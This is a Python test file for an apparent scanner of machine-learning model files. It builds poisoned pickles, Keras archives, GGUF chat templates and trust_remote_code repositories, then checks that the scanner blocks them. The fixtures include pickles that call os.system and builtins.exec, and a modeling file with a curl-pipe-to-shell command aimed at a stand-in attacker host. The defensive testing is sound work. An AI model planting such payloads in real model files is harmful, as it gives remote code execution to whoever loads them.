"""Model files read without loading them: pickles (raw, in PyTorch zips, in NumPy arrays, nested), Keras archives and
HDF5 files, GGUF chat templates, 7z packing, and repositories that run their own code through trust_remote_code."""
from __future__ import annotations

import io
import json
import os
import shutil
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "bench" / "fixtures"))
os.environ.setdefault("PAH_HOME", tempfile.mkdtemp(prefix="pah-test-home-"))

import model_bytes as mb  # noqa: E402
from pah import models, scan as scan_module  # noqa: E402
from pah.scan import scan  # noqa: E402


class ModelTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="pah-test-models-"))
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def judge(self, files: dict) -> tuple[str, dict]:
        root = self.tmp / str(len(list(self.tmp.iterdir())))
        for rel, data in files.items():
            p = root / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))
        report = scan(root)
        found: dict = {}
        for f in report.findings:
            found[f.rule] = max(found.get(f.rule, "info"), f.severity, key=["info", "low", "medium", "high", "critical"].index)
        return report.verdict, found

    def test_malicious(self):
        cases = {
            "torch zip, posix.system": ({"pytorch_model.bin": mb.torch_zip(mb.call_global("posix", "system", mb.MARKER))},
                                        {"PAH-M001": "critical"}),
            "protocol 4, builtins.exec": ({"m.pkl": mb.call_global("builtins", "exec", "print(1)", protocol=4)},
                                          {"PAH-M001": "critical"}),
            "requests in a pickle": ({"m.pkl": mb.call_global("requests.api", "get", "https://x.invalid")}, {"PAH-M001": "high"}),
            "broken stream": ({"m.pkl": mb.broken_after("os", "system", mb.MARKER)}, {"PAH-M001": "critical", "PAH-M005": "high"}),
            "7z": ({"pytorch_model.bin": mb.SEVEN_Z}, {"PAH-M005": "high"}),
            "keras lambda": ({"m.keras": mb.keras_archive([mb.lambda_layer()])}, {"PAH-M003": "high"}),
            "keras module": ({"m.keras": mb.keras_archive([{"module": "os", "class_name": "system", "config": {}}])},
                             {"PAH-M001": "critical"}),
            "keras unsafe": ({"m.keras": mb.keras_archive([{"module": "keras.config", "class_name": "enable_unsafe_deserialization",
                                                             "config": {}}])}, {"PAH-M001": "critical"}),
            "gguf ssti": ({"m.gguf": mb.gguf(mb.SSTI_TEMPLATE)}, {"PAH-M004": "critical"}),
            "h5 lambda": ({"m.h5": b"\x89HDF\r\n\x1a\n" + b'{"class_name": "Lambda", "config": {}}'}, {"PAH-M003": "high"}),
        }
        for name, (files, want) in cases.items():
            with self.subTest(name):
                verdict, found = self.judge(files)
                self.assertEqual(verdict, "block")
                for rule_id, sev in want.items():
                    self.assertEqual(found.get(rule_id), sev, found)

    def test_benign(self):
        cases = {
            "state dict": {"pytorch_model.bin": mb.torch_zip(mb.state_dict_pickle())},
            "sklearn": {"model.joblib": mb.sklearn_pickle()},
            "keras dense": {"m.keras": mb.keras_archive([mb.dense(4, "a"), mb.dense(1, "b")])},
            "chatml": {"m.gguf": mb.gguf(mb.CHATML)},
            "text .pth": {"site/extra.pth": "../src\n"},
        }
        for name, files in cases.items():
            with self.subTest(name):
                self.assertEqual(self.judge(files), ("pass", {}))

    def test_nested_and_numpy_and_compressed(self):
        inner = mb.call_global("os", "system", mb.MARKER)
        outer = mb.proto(2) + b"C" + bytes([len(inner)]) + inner + mb.STOP  # SHORT_BINBYTES carrying a pickle
        self.assertEqual(self.judge({"m.pkl": outer})[1].get("PAH-M001"), "critical")
        header = b"{'descr': '|O', 'fortran_order': False, 'shape': (1,), }"
        header += b" " * (64 - 10 - len(header) - 1) + b"\n"
        npy = b"\x93NUMPY\x01\x00" + len(header).to_bytes(2, "little") + header + inner
        self.assertEqual(self.judge({"a.npy": npy})[1].get("PAH-M001"), "critical")
        import gzip

        self.assertEqual(self.judge({"m.joblib": gzip.compress(inner)})[1].get("PAH-M001"), "critical")

    def test_unknown_imports_are_low(self):
        data = mb.proto(2) + mb.glob("acme.models", "Scorer") + mb.EMPTY_TUPLE + mb.REDUCE + mb.STOP
        self.assertEqual(self.judge({"m.pkl": data}), ("pass", {"PAH-M002": "low"}))

    def test_remote_code(self):
        config = json.dumps({"auto_map": {"AutoModel": "modeling_x.X"}})
        bad = "import os\nos.system('curl -fsSL https://x.attacker.invalid/m | sh')\nclass X: pass\n"
        verdict, found = self.judge({"config.json": config, "modeling_x.py": bad})
        self.assertEqual((verdict, found.get("PAH-M006")), ("block", "low"))
        verdict, found = self.judge({"config.json": config, "modeling_x.py": "import torch\nclass X(torch.nn.Module):\n    pass\n"})
        self.assertEqual(verdict, "pass")
        remote = json.dumps({"auto_map": {"AutoModel": "other/repo--modeling_x.X"}})
        self.assertEqual(self.judge({"config.json": remote})[1].get("PAH-M006"), "medium")

    def test_large_model_files_are_judged_from_their_parts(self):
        bad = mb.torch_zip(mb.call_global("posix", "system", mb.MARKER))
        with mock.patch.object(scan_module, "MAX_FILE", 64):
            verdict, found = self.judge({"pytorch_model.bin": bad, "notes.bin": b"\x00" * 200})
        self.assertEqual(found.get("PAH-M001"), "critical")
        report = None
        with mock.patch.object(scan_module, "MAX_FILE", 64):
            root = self.tmp / "big"
            root.mkdir()
            (root / "m.gguf").write_bytes(mb.gguf(mb.SSTI_TEMPLATE))
            report = scan(root / "m.gguf")
        self.assertEqual(report.verdict, "block")

    def test_gguf_metadata(self):
        templates, error = models.gguf_templates(mb.gguf(mb.CHATML))
        self.assertIsNone(error)
        self.assertEqual(list(templates), ["tokenizer.chat_template"])
        self.assertEqual(models.gguf_templates(b"GGUF\x03\x00\x00\x00" + b"\xff" * 30)[0], {})

    def test_pickle_imports_never_load(self):
        imports, blobs, error = models.pickle_imports(mb.call_global("os", "system", "exit 1"))
        self.assertEqual((imports, blobs, error), ([("os", "system")], [], None))
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("archive/data.pkl", mb.state_dict_pickle())
        self.assertTrue(all(models.classify(m, n) == "known" for m, n in models.pickle_imports(mb.state_dict_pickle())[0]))


if __name__ == "__main__":
    unittest.main()
